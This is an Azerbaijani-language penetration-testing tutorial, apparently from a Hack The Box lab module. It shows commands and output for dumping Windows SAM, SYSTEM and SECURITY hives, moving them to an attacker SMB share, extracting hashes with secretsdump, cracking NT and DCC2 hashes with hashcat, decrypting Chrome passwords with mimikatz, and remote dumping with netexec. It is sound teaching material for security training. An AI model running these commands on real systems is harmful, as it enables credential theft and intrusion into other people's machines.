## SAM, SYSTEM və SECURITY Hücumu

Windows sisteminə **inzibati giriş** əldə etdikdə, biz **SAM verilənlər bazası** ilə əlaqəli faylları tez bir zamanda *dump* etməyə (çıxarmağa), hücumçu hostumuza köçürməyə və şifrə heşlərini *oflayn* rejimdə sındırmağa cəhd edə bilərik. Bu prosesi oflayn yerinə yetirmək, hədəflə aktiv seansı saxlamağa ehtiyac qalmadan hücumlarımıza davam etməyə imkan verir. Gəlin, hədəf hostdan istifadə edərək bu prosesi birlikdə nəzərdən keçirək.

### Registriyyat Hivləri (Registry Hives)

Hədəf sistemdə yerli inzibati girişimiz varsa, kopyalaya biləcəyimiz üç registriyyat *hive* (kovan) var. Onların hər biri şifrə heşlərini *dump* etmək və sındırmaq məsələsində xüsusi bir məqsədə xidmət edir. Onların hər biri haqqında qısa təsvir aşağıdakı cədvəldə verilmişdir:

| Registriyyat Hive | Təsvir |
| :--- | :--- |
| **HKLM\\SAM** | Yerli istifadəçi hesabları üçün **şifrə heşlərini** ehtiva edir. Bu heşlər çıxarıla və *plaintext* şifrələri üzə çıxarmaq üçün sındırıla bilər. |
| **HKLM\\SYSTEM** | **Sistem yükləmə açarını (system boot key)** saxlayır, bu da SAM verilənlər bazasını şifrələmək üçün istifadə olunur. Heşləri deşifrə etmək üçün bu açar tələb olunur. |
| **HKLM\\SECURITY** | **Yerli Təhlükəsizlik Orqanı (LSA)** tərəfindən istifadə olunan həssas məlumatları, o cümlədən keşlənmiş domen etimadnamələrini (**DCC2**), *cleartext* şifrələri, **DPAPI** açarlarını və s. ehtiva edir. |

Bu hivləri **`reg.exe`** utilitindən istifadə edərək ehtiyat nüsxəsini çıxara bilərik.

### Registriyyat Hivlərini Kopyalamaq üçün `reg.exe` istifadəsi

İnzibati imtiyazlarla **`cmd.exe`** işə salmaqla, registriyyat hivlərinin kopyalarını yaddaşa yazmaq üçün `reg.exe` istifadə edə bilərik. Aşağıdakı əmrləri icra edin:

```
C:\WINDOWS\system32> reg.exe save hklm\sam C:\sam.save

Əməliyyat uğurla tamamlandı.

C:\WINDOWS\system32> reg.exe save hklm\system C:\system.save

Əməliyyat uğurla tamamlandı.

C:\WINDOWS\system32> reg.exe save hklm\security C:\security.save

Əməliyyat uğurla tamamlandı.
```

Əgər yalnız yerli istifadəçilərin heşlərini *dump* etməklə maraqlanırıqsa, bizə yalnız **`HKLM\SAM`** və **`HKLM\SYSTEM`** lazımdır. Lakin, domenə qoşulmuş sistemlərdə keşlənmiş domen istifadəçi etimadnamələrini və digər dəyərli məlumatları ehtiva edə biləcəyi üçün **`HKLM\SECURITY`** hive-ni yaddaşa yazmaq da tez-tez faydalı olur. Bu hivlər oflayn olaraq yaddaşa yazıldıqdan sonra, onları hücumçu hostumuza köçürmək üçün müxtəlif üsullardan istifadə edə bilərik. Bu vəziyyətdə, hive kopyalarını hücumçu maşınımızda yerləşən bir *share* (paylaşım) sahəsinə köçürmək üçün Impacket-in **`smbserver`**-ından və bəzi əsas CMD əmrlərindən istifadə edəcəyik.

### `smbserver` ilə Paylaşım Yaratmaq

Paylaşımı yaratmaq üçün sadəcə **`smbserver.py -smb2support`** əmrini işə salırıq, paylaşım üçün bir ad (məsələn, `CompData`) təyin edirik və hive kopyalarının saxlanılacağı hücumçu hostumuzdakı yerli qovluğu göstəririk (məsələn, `/home/ltnbob/Documents`). `-smb2support` bayrağı SMB-nin daha yeni versiyaları ilə uyğunluğu təmin edir. Bu bayrağı daxil etməsək, SMBv1-in **çoxsaylı ciddi zəifliklərə** və ictimaiyyətə açıq *exploit*-lərə görə defolt olaraq söndürüldüyü üçün daha yeni Windows sistemləri paylaşmaya qoşula bilməz.

```bash
nijatmansimov@htb[/htb]$ sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support CompData /home/ltnbob/Documents/
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Konfiqurasiya faylı parse edildi
[*] UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0 üçün geri zəng əlavə edildi
[*] UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0 üçün geri zəng əlavə edildi
[*] Konfiqurasiya faylı parse edildi
[*] Konfiqurasiya faylı parse edildi
[*] Konfiqurasiya faylı parse edildi
```

Paylaşım hücumçu hostumuzda işə düşdükdən sonra, hive kopyalarını paylaşım sahəsinə köçürmək üçün Windows hədəfindəki **`move`** əmrindən istifadə edə bilərik.

### Hive Kopyalarını Paylaşıma Köçürmək

```
C:\> move sam.save \\10.10.15.16\CompData
        1 fayl köçürüldü.

C:\> move security.save \\10.10.15.16\CompData
        1 fayl köçürüldü.

C:\> move system.save \\10.10.15.16\CompData
        1 fayl köçürüldü.
```

Daha sonra hücumçu hostumuzda paylaşılan qovluğa keçərək və faylları siyahılamaq üçün **`ls`** əmrini istifadə edərək hive kopyalarımızın uğurla köçürüldüyünü təsdiqləyə bilərik.

```bash
nijatmansimov@htb[/htb]$ ls
sam.save  security.save  system.save
```

### `secretsdump` ilə Heşləri Çıxarmaq (*Dumping*)

Heşləri oflayn çıxarmaq üçün xüsusilə faydalı bir alət Impacket-in **`secretsdump`**-ıdır. Impacket əksər müasir *penetration testing* (sızma testi) distributivlərinə daxildir. Linux əsaslı sistemdə quraşdırılıb-quraşdırılmadığını yoxlamaq üçün **`locate`** əmrini istifadə edə bilərik:

```bash
nijatmansimov@htb[/htb]$ locate secretsdump 
```

`secretsdump` istifadəsi sadədir. Biz sadəcə skripti Python ilə işə salırıq və hədəf hostdan əldə etdiyimiz hər bir *hive* faylını göstəririk.

```bash
nijatmansimov@htb[/htb]$ python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam.save -security security.save -system system.save LOCAL
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Hədəf sistemin bootKey-i: 0x4d8c7cff8a543fbf245a363d2ffce518
[*] Yerli SAM heşləri çıxarılır (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:3dd5a5ef0ed25b8d6add8b2805cce06b:::
defaultuser0:1000:aad3b435b51404eeaad3b435b51404ee:683b72db605d064397cf503802b51857:::
bob:1001:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
sam:1002:aad3b435b51404eeaad3b435b51404ee:6f8c3f4d3869a10f3b4f0522f537fd33:::
rocky:1003:aad3b435b51404eeaad3b435b51404ee:184ecdda8cf1dd238d438c4aea4d560d:::
ITlocal:1004:aad3b435b51404eeaad3b435b51404ee:f7eb9c06fafaa23c4bcf22ba6781c1e2:::
[*] Keşlənmiş domen loqin məlumatları çıxarılır (domain/username:hash)
[*] LSA Sirləri çıxarılır
[*] DPAPI_SYSTEM 
dpapi_machinekey:0xb1e1744d2dc4403f9fb0420d84c3299ba28f0643
dpapi_userkey:0x7995f82c5de363cc012ca6094d381671506fd362
[*] NL$KM  0000   D7 0A F4 B9 1E 3E 77 34  94 8F C4 7D AC 8F 60 69   .....>w4...}..`i
 0010   52 E1 2B 74 FF B2 08 5F  59 FE 32 19 D6 A7 2C F8   R.+t..._Y.2...,.
 0020   E2 A4 80 E0 0F 3D F8 48  44 98 87 E1 C9 CD 4B 28   .....=.HD.....K(
 0030   9B 7B 8B BF 3D 59 DB 90  D8 C7 AB 62 93 30 6A 42   .{..=Y.....b.0jB
NL$KM:d70af4b91e3e7734948fc47dac8f606952e12b74ffb2085f59fe3219d6a72cf8e2a480e00f3df848449887e1c9cd4b289b7b8bbf3d59db90d8c7ab6293306a42
[*] Təmizlənir... 
```

Burada görürük ki, `secretsdump` yerli **SAM heşlərini**, həmçinin keşlənmiş domen loqin məlumatlarını və DPAPI üçün maşın və istifadəçi açarları kimi **LSA sirlərini** ehtiva edən `hklm\security` məlumatlarını uğurla çıxarıb.

Qeyd edək ki, `secretsdump`-ın ilk addımı yerli SAM heşlərini çıxarmağa başlamazdan əvvəl **sistem yükləmə açarını (system bootkey)** əldə etməkdir. Bu, vacibdir, çünki *bootkey* SAM verilənlər bazasını şifrələmək və deşifrə etmək üçün istifadə olunur. Onsuz heşlər deşifrə edilə bilməz — buna görə də əvvəlcə qeyd edildiyi kimi, müvafiq registriyyat hivlərinin kopyalarına sahib olmaq kritikdir.

Bundan əlavə, aşağıdakı sətrə diqqət yetirin:

```
Dumping local SAM hashes (uid:rid:lmhash:nthash)
```

Bu bizə çıxışı necə şərh etməli olduğumuzu və hansı heşləri sındırmağa cəhd edə biləcəyimizi göstərir. Ən müasir Windows əməliyyat sistemləri şifrələri **NT heşləri** kimi saxlayır. Daha köhnə sistemlər (məsələn, Windows Vista və Windows Server 2008-dən əvvəlki sistemlər) daha zəif və sındırılması daha asan olan **LM heşləri** kimi saxlaya bilər. Buna görə də, hədəf daha köhnə bir Windows versiyası işlədirsə, LM heşləri faydalıdır.

Bunu nəzərə alaraq, hər bir istifadəçi hesabı ilə əlaqəli NT heşlərini bir mətn faylına kopyalaya və şifrələri sındırmağa başlaya bilərik. Nəticələri izləmək üçün hansı heşin hansı istifadəçiyə uyğun gəldiyini qeyd etmək faydalıdır.

### Hashcat ilə Heşləri Sındırmaq

Heşləri əldə etdikdən sonra, onları **Hashcat** istifadə edərək sındırmağa başlaya bilərik. Hashcat öz veb-saytında göstərildiyi kimi geniş spektrli heşləmə alqoritmlərini dəstəkləyir. Bu modulda biz Hashcat-i xüsusi istifadə halları üçün tətbiq etməyə diqqət yetirəcəyik. Bu yanaşma, Hashcat-i nə vaxt və necə effektiv istifadə edəcəyinizi və ələ keçirdiyiniz heşlərin növünə əsasən müvafiq modu və seçimləri müəyyən etmək üçün onun sənədlərinə necə müraciət edəcəyinizi anlamağa kömək edəcək.

Əvvəlcə qeyd edildiyi kimi, *dump* edə bildiyimiz NT heşlərini bir mətn faylına yerləşdirə bilərik.

```bash
nijatmansimov@htb[/htb]$ sudo vim hashestocrack.txt
64f12cddaa88057e06a81b54e73b949b
31d6cfe0d16ae931b73c59d7e0c089c0
6f8c3f4d3869a10f3b4f0522f537fd33
184ecdda8cf1dd238d438c4aea4d560d
f7eb9c06fafaa23c4bcf22ba6781c1e2
```

NT heşləri indi mətn faylımızda (`hashestocrack.txt`) olduğuna görə, onları sındırmaq üçün Hashcat-dən istifadə edə bilərik.

### NT Heşlərinə Qarşı Hashcat-i İşə Salmaq

Hashcat bir çox fərqli modu dəstəkləyir və doğru birini seçmək, əsasən hücumun növündən və sındırmaq istədiyimiz xüsusi heş növündən asılıdır. Bütün mövcud modları əhatə etmək bu modulun əhatə dairəsindən kənardır, buna görə də NT heşlərinə (həmçinin **NTLM-əsaslı heşlər** kimi tanınır) uyğun gələn **`1000`** heş növünü təyin etmək üçün **`-m`** seçimindən istifadə etməyə diqqət yetirəcəyik. Dəstəklənən heş növlərinin və onlarla əlaqəli mod nömrələrinin tam siyahısı üçün Hashcat-in **wiki səhifəsinə** müraciət edə və ya *man page*-i yoxlaya bilərik.

```bash
nijatmansimov@htb[/htb]$ sudo hashcat -m 1000 hashestocrack.txt /usr/share/wordlists/rockyou.txt
hashcat (v6.1.1) işə düşür...

<SNIP>

Lüğət keş vurdu:
* Fayl adı..: /usr/share/wordlists/rockyou.txt
* Şifrələr.: 14344385
* Baytlar.....: 139921507
* Açar sahəsi..: 14344385

f7eb9c06fafaa23c4bcf22ba6781c1e2:dragon          
6f8c3f4d3869a10f3b4f0522f537fd33:iloveme         
184ecdda8cf1dd238d438c4aea4d560d:adrian          
31d6cfe0d16ae931b73c59d7e0c089c0:                
                                                 
Seans..........: hashcat
Status...........: Sındırıldı (Cracked)
Heş.Adı........: NTLM
Heş.Hədəfi......: dumpedhashes.txt
Başlama.Vaxtı.....: Çərş. Dek 14 14:16:56 2021 (0 san)
Təxmini.Vaxt...: Çərş. Dek 14 14:16:56 2021 (0 san)
Təxmin.Baza.......: Fayl (/usr/share/wordlists/rockyou.txt)
Təxmin.Növbəsi......: 1/1 (100.00%)
Sürət.#1.........:    14284 H/s (0.63ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Bərpa.Edildi........: 5/5 (100.00%) Digestlər
İrəliləyiş.........: 8192/14344385 (0.06%)
Rədd.Edildi.........: 0/8192 (0.00%)
Bərpa.Nöqtəsi....: 4096/14344385 (0.03%)
Bərpa.Alt.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Kandidatlar.#1....: newzealand -> whitetiger
Başladı: Çərş. Dek 14 14:16:50 2021
Dayandı: Çərş. Dek 14 14:16:58 2021
```

Çıxışdan görə bilərik ki, Hashcat heşlərdən üçünü uğurla sındırıb. Bu şifrələrə sahib olmaq bir çox yolla faydalı ola bilər. Məsələn, sındırılmış etimadnamələrdən istifadə edərək şəbəkədəki digər sistemlərə daxil olmağa cəhd edə bilərik. İstifadəçilərin şifrələri müxtəlif iş və şəxsi hesablar arasında yenidən istifadə etməsi çox yaygındır. Bu texnikanı anlamaq və tətbiq etmək qiymətləndirmələr zamanı dəyərli ola bilər. Biz zəif bir Windows sistemi ilə qarşılaşdığımız və SAM verilənlər bazasını *dump* etmək üçün inzibati hüquqlar əldə etdiyimiz hər an bundan faydalanacağıq.

Unutmayın ki, bu, yaxşı tanınan bir texnikadır və administratorlar onu aşkar etmək və ya qarşısını almaq üçün təhlükəsizlik tədbirləri tətbiq etmiş ola bilərlər. **MITRE ATT\&CK** çərçivəsində bir neçə aşkarlama və azaldılma strategiyası sənədləşdirilmişdir.

### DCC2 Heşləri

Əvvəllər qeyd edildiyi kimi, `hklm\security` keşlənmiş domen loqin məlumatlarını, xüsusən də **DCC2 heşləri** şəklində ehtiva edir. Bunlar şəbəkə etimadnamə heşlərinin yerli, heşlənmiş kopyalarıdır. Bir nümunə:

```
inlanefreight.local/Administrator:$DCC2$10240#administrator#23d97555681813db79b2ade4b4a6ff25
```

Bu növ heş, **PBKDF2** istifadə etdiyi üçün NT heşindən daha çətin sındırılır. Əlavə olaraq, **Pass-the-Hash** kimi texnikalarla lateral hərəkət üçün istifadə edilə bilməz (bunu daha sonra nəzərdən keçirəcəyik). DCC2 heşlərini sındırmaq üçün Hashcat modu **`2100`**-dır.

```bash
nijatmansimov@htb[/htb]$ hashcat -m 2100 '$DCC2$10240#administrator#23d97555681813db79b2ade4b4a6ff25' /usr/share/wordlists/rockyou.txt
<SNIP>
$DCC2$10240#administrator#23d97555681813db79b2ade4b4a6ff25:ihatepasswords                                                          
Seans..........: hashcat
Status...........: Sındırıldı (Cracked)
Heş.Modu........: 2100 (Domain Cached Credentials 2 (DCC2), MS Cache 2)
Heş.Hədəfi......: $DCC2$10240#administrator#23d97555681813db79b2ade4b4a6ff25
Başlama.Vaxtı.....: Çərş. Apr 22 09:12:53 2025 (27 san)
Təxmini.Vaxt...: Çərş. Apr 22 09:13:20 2025 (0 san)
Nüvə.Xüsusiyyəti...: Pure Kernel
Təxmin.Baza.......: Fayl (/usr/share/wordlists/rockyou.txt)
Təxmin.Növbəsi......: 1/1 (100.00%)
Sürət.#1.........:     5536 H/s (8.70ms) @ Accel:256 Loops:1024 Thr:1 Vec:8
Bərpa.Edildi........: 1/1 (100.00%) Digest (cəmi), 1/1 (100.00%) Digest (yeni)
İrəliləyiş.........: 149504/14344385 (1.04%)
Rədd.Edildi.........: 0/149504 (0.00%)
Bərpa.Nöqtəsi....: 148992/14344385 (1.04%)
Bərpa.Alt.#1...: Salt:0 Amplifier:0-1 Iteration:9216-10239
Kandidat.Mühərriki.: Device Generator
Kandidatlar.#1....: ilovelloyd -> gerber1
Avadanlıq.Mon.#1..: Util: 95%
Başladı: Çərş. Apr 22 09:12:33 2025
Dayandı: Çərş. Apr 22 09:13:22 2025
```

**5536 H/s** sındırma sürətinə diqqət yetirin. Eyni maşında NTLM heşləri **4605.4 kH/s** sürətlə sındırıla bilər. Bu o deməkdir ki, DCC2 heşlərini sındırmaq təxminən **800 dəfə yavaşdır**. Dəqiq rəqəmlər, əlbəttə ki, mövcud avadanlıqdan çox asılı olacaq, lakin əsas nəticə ondan ibarətdir ki, güclü şifrələr tipik *penetration testing* müddətləri daxilində sındırıla bilməz.

### DPAPI

DCC2 heşlərinə əlavə olaraq, biz əvvəllər `hklm\security`-dən **DPAPI** üçün **maşın və istifadəçi açarlarının** da *dump* edildiyini gördük. **Data Protection Application Programming Interface** və ya **DPAPI**, Windows əməliyyat sistemlərində istifadəçi əsasında məlumat *blob*-larını şifrələmək və deşifrə etmək üçün istifadə olunan bir sıra API-lərdir. Bu *blob*-lar müxtəlif Windows OS xüsusiyyətləri və üçüncü tərəf tətbiqləri tərəfindən istifadə olunur. Aşağıda DPAPI istifadə edən tətbiqlərin və onların DPAPI-dən necə istifadə etdiklərinin yalnız bir neçə nümunəsi verilmişdir:

| Tətbiqlər | DPAPI-dən İstifadəsi |
| :--- | :--- |
| **Internet Explorer** | Şifrə formunun avtomatik tamamlanma məlumatları (yadda saxlanmış saytlar üçün istifadəçi adı və şifrə). |
| **Google Chrome** | Şifrə formunun avtomatik tamamlanma məlumatları (yadda saxlanmış saytlar üçün istifadəçi adı və şifrə). |
| **Outlook** | E-poçt hesabları üçün şifrələr. |
| **Remote Desktop Connection** | Uzaq maşınlara qoşulmaq üçün yadda saxlanmış etimadnamələr. |
| **Credential Manager** | Paylaşılan resurslara, Simsiz şəbəkələrə qoşulmaq, VPN-lərə və daha çoxuna daxil olmaq üçün yadda saxlanmış etimadnamələr. |

DPAPI ilə şifrələnmiş etimadnamələr Impacket-in **`dpapi`**, **`mimikatz`** və ya uzaqdan **`DonPAPI`** kimi alətlərlə əl ilə deşifrə edilə bilər.

```
C:\Users\Public> mimikatz.exe
mimikatz # dpapi::chrome /in:"C:\Users\bob\AppData\Local\Google\Chrome\User Data\Default\Login Data" /unprotect
> Yerli vəziyyət faylında şifrələnmiş açar tapıldı
> Şifrələnmiş açar DPAPI tərəfindən qorunur
 * CryptUnprotectData API istifadə olunur
> AES Açar: efefdb353f36e6a9b7a7552cc421393daf867ac28d544e4f6f157e0a698e343c

URL     : http://10.10.14.94/ ( http://10.10.14.94/login.html )
İstifadəçi adı: bob
 * AES-256-GCM ilə BCrypt istifadə olunur
Şifrə: April2025!
```

### Uzaqdan *Dumping* və LSA Sirləri Mülahizələri

**Yerli administrator imtiyazlarına** malik etimadnamələrə girişlə, **LSA sirlərini** şəbəkə üzərindən hədəf almaq da mümkündür. Bu, bizə işləyən xidmətlərdən, planlaşdırılmış tapşırıqlardan və ya şifrələri LSA sirləri istifadə edərək saxlayan tətbiqlərdən etimadnamələri çıxarmağa imkan verə bilər.

#### LSA Sirlərini Uzaqdan Çıxarmaq

```bash
nijatmansimov@htb[/htb]$ netexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --lsa
SMB         10.129.42.198   445    WS01     [*] Windows 10.0 Build 18362 x64 (name:FRONTDESK01) (domain:FRONTDESK01) (signing:False) (SMBv1:False)
SMB         10.129.42.198   445    WS01     [+] WS01\bob:HTB_@cademy_stdnt!(Pwn3d!)
SMB         10.129.42.198   445    WS01     [+] LSA sirləri çıxarılır
SMB         10.129.42.198   445    WS01     WS01\worker:Hello123
SMB         10.129.42.198   445    WS01      dpapi_machinekey:0xc03a4a9b2c045e545543f3dcb9c181bb17d6bdce
dpapi_userkey:0x50b9fa0fd79452150111357308748f7ca101944a
SMB         10.129.42.198   445    WS01     NL$KM:e4fe184b25468118bf23f5a32ae836976ba492b3a432deb3911746b8ec63c451a70c1826e9145aa2f3421b98ed0cbd9a0c1a1befacb376c590fa7b56ca1b488b
SMB         10.129.42.198   445    WS01     [+] 3 LSA siri /home/bob/.cme/logs/FRONTDESK01_10.129.42.198_2022-02-07_155623.secrets və /home/bob/.cme/logs/FRONTDESK01_10.129.42.198_2022-02-07_155623.cached fayllarına çıxarıldı
```

#### SAM-ı Uzaqdan Çıxarmaq

Eyni şəkildə, SAM verilənlər bazasından heşləri uzaqdan *dump* etmək üçün **`netexec`** istifadə edə bilərik.

```bash
nijatmansimov@htb[/htb]$ netexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --sam
SMB         10.129.42.198   445    WS01      [*] Windows 10.0 Build 18362 x64 (name:FRONTDESK01) (domain:WS01) (signing:False) (SMBv1:False)
SMB         10.129.42.198   445    WS01      [+] FRONTDESK01\bob:HTB_@cademy_stdnt! (Pwn3d!)
SMB         10.129.42.198   445    WS01      [+] SAM heşləri çıxarılır
SMB         10.129.42.198   445    WS01      Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         10.129.42.198   445    WS01     Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         10.129.42.198   445    WS01     DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         10.129.42.198   445    WS01     WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:72639bbb94990305b5a015220f8de34e:::
SMB         10.129.42.198   445    WS01     bob:1001:aad3b435b51404eeaad3b435b51404ee:cf3a5525ee9414229e66279623ed5c58:::
SMB         10.129.42.198   445    WS01     sam:1002:aad3b435b51404eeaad3b435b51404ee:a3ecf31e65208382e23b3420a34208fc:::
SMB         10.129.42.198   445    WS01     rocky:1003:aad3b435b51404eeaad3b435b51404ee:c02478537b9727d391bc80011c2e2321:::
SMB         10.129.42.198   445    WS01     worker:1004:aad3b435b51404eeaad3b435b51404ee:58a478135a93ac3bf058a5ea0e8fdb71:::
SMB         10.129.42.198   445    WS01     [+] Verilənlər bazasına 8 SAM heşi əlavə edildi
```
